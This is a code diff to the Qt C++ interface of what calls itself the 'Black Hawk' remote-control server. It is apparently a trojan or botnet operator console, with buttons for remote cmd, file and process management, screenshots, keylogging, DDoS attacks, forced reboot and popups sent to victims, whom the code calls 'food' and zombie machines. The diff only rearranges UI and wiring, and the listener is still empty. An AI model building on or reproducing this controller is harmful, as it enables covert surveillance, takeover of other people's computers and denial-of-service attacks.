@@ -12,30 +12,47 @@ Hunter::Hunter(QWidget *parent)
     this->setWindowTitle("Black Hawk 远控软件服务端 by lfish");
     this->setFixedSize(700, 500);
 
+    // 总设置区
+    ui->widgetOption->setFixedHeight(200);
+
+    // 图片区
+    ui->labelSister->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
+    ui->labelSister->setContentsMargins(0, 6, 0, 6);
+    ui->labelSister->setText("");
+    QMovie *movie = new QMovie(":/Icons/lze.gif");
+    movie->start();
+    ui->labelSister->setMovie(movie);
+    ui->labelSister->setScaledContents(true);
+
     // 按键区
+    ui->widgetBt->setFixedWidth(200);
+    // 设置自适应大小
     ui->btFile->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
     ui->btCmd->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
     ui->btScreen->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
     ui->btProcess->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
     ui->btDDos->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
     ui->btKeybd->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
-
-    ui->btFile->setText("文件管理");
-    ui->btCmd->setText("远程cmd");
-    ui->btScreen->setText("屏幕截图");
-    ui->btDDos->setText("DDOS攻击");
-    ui->btProcess->setText("进程管理");
-    ui->btKeybd->setText("键盘监控");
-
-    // 设置区
-    ui->widgetOption->setFixedHeight(200);
+    ui->btSendBox->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
+    ui->btReboot->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
+    ui->btOffline->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
+    // 按钮文字
+    ui->btFile->setText("文件\n管理");
+    ui->btCmd->setText("远程\ncmd");
+    ui->btScreen->setText("屏幕\n截图");
+    ui->btDDos->setText("DDOS\n攻击");
+    ui->btProcess->setText("进程\n管理");
+    ui->btKeybd->setText("键盘\n监控");
+    ui->btSendBox->setText("发送\n弹窗");
+    ui->btReboot->setText("强制\n重启");
+    ui->btOffline->setText("强行\n下线");
 
     // 初始化区
     ui->widgetInit->setFixedWidth(200);
 
-    ui->labelIP->setText("IP");
+    ui->labelDomain->setText("域名");
     ui->labelPort->setText("端口");
-    ui->labelIP->setAlignment(Qt::AlignCenter);
+    ui->labelDomain->setAlignment(Qt::AlignCenter);
     ui->labelPort->setAlignment(Qt::AlignCenter);
 
     ui->btStart->setText("开始监听");
@@ -49,7 +66,6 @@ Hunter::Hunter(QWidget *parent)
     ui->tableOnline->setHorizontalHeaderItem(3, new QTableWidgetItem("端口号"));
     ui->tableOnline->setHorizontalHeaderItem(4, new QTableWidgetItem("系统信息"));
     // 自适应列宽
-    // ui->tableOnline->horizontalHeader()->setSectionResizeMode(QHeaderView::Stretch);
     ui->tableOnline->horizontalHeader()->setStretchLastSection(true);
     ui->tableOnline->horizontalHeader()->setSectionResizeMode(0, QHeaderView::ResizeToContents);
     // 隐藏水平表头
@@ -62,17 +78,15 @@ Hunter::Hunter(QWidget *parent)
     ui->tableOnline->setEditTriggers(QAbstractItemView::NoEditTriggers);
     ui->tableOnline->setContextMenuPolicy(Qt::CustomContextMenu);
 
-    // 右键出现的每一项的菜单 连接对应逻辑
+    // ----------------------------------------按键与对应逻辑--------------------------------------------------
     // 对食物发送弹窗
-    mRclick = new QMenu(this);
-    QAction *actSendBox = mRclick->addAction("发送弹窗");
-    connect(actSendBox, &QAction::triggered, this, [=](){
+    connect(ui->btSendBox, &QPushButton::clicked, this, [=](){
         // 获取当前用户id
         int id = curFoodIdInTbl();
         if (id != -1)
         {
             bool isSend;
-            QString text = QInputDialog::getText(this, QString("给%0号食物说句话").arg(id),
+            QString text = QInputDialog::getText(this, QString("给%0号食物一点安慰").arg(id),
                                                  "请输入您对它的肺腑之言：", QLineEdit::Normal,
                                                  "", &isSend);
 
@@ -85,12 +99,12 @@ Hunter::Hunter(QWidget *parent)
         }
         else
         {
-            qDebug() << "不能发弹窗，食物不在线呀主人！";
+            qDebug() << "不能发弹窗，没有食物呀主人！";
         }
     });
+
     // 强制食物重启
-    QAction *actReboot = mRclick->addAction("重启电脑");
-    connect(actReboot, &QAction::triggered, this, [=](){
+    connect(ui->btReboot, &QPushButton::clicked, this, [=](){
         // 获取当前用户id
         int id = curFoodIdInTbl();
         if (id != -1)
@@ -106,22 +120,17 @@ Hunter::Hunter(QWidget *parent)
         }
         else
         {
-            qDebug() << "不能强制重启，食物不在线呀主人！";
+            qDebug() << "不能强制重启，没有食物呀主人！";
         }
     });
+
     // 强制食物下线
-    QAction *actOffline = mRclick->addAction("强制下线");
-    connect(actOffline, &QAction::triggered, this, [=](){
-
-
+    connect(ui->btOffline, &QPushButton::clicked, this, [=](){
         // 获取当前用户id
-        QMessageBox::question(this, "亲爱的主人", "真的要下线这块食物吗",
-                              QMessageBox::Yes | QMessageBox::No,
-                              QMessageBox::Yes);
         int id = curFoodIdInTbl();
         if (id != -1)
         {
-            if(QMessageBox::Yes==QMessageBox::question(this, "问一哈", "真的要下线这台肉鸡吗",
+            if(QMessageBox::Yes==QMessageBox::question(this, "问一哈", "真的要下线这块食物吗",
                                                        QMessageBox::Yes | QMessageBox::No,
                                                        QMessageBox::Yes))
             {
@@ -132,13 +141,12 @@ Hunter::Hunter(QWidget *parent)
         }
         else
         {
-            qDebug() << "不能强制下线，食物不在线呀主人！";
+            qDebug() << "不能强制下线，没有食物呀主人！";
         }
     });
 
-    // 将菜单添加至鼠标事件中 再拦截鼠标事件得以处理
-    mRclick->installEventFilter(this);
 
+    // ----------------------------------------按键与对应逻辑（完毕）--------------------------------------------------
 
     // 测试
     mCook = new Cook(this);
@@ -209,16 +217,4 @@ int Hunter::curFoodIdInTbl(){
 // 开启服务器监听
 void Hunter::startLstn(){
 
-}
-
-// 重写事件过滤函数
-bool Hunter::eventFilter(QObject *watched, QEvent *event){
-    // 右键弹出菜单
-    if (watched == (QObject*)ui->tableOnline) {
-        if (event->type() == QEvent::ContextMenu) {
-            mRclick->exec(QCursor::pos());
-        }
-    }
-
-    return QObject::eventFilter(watched, event);
 }
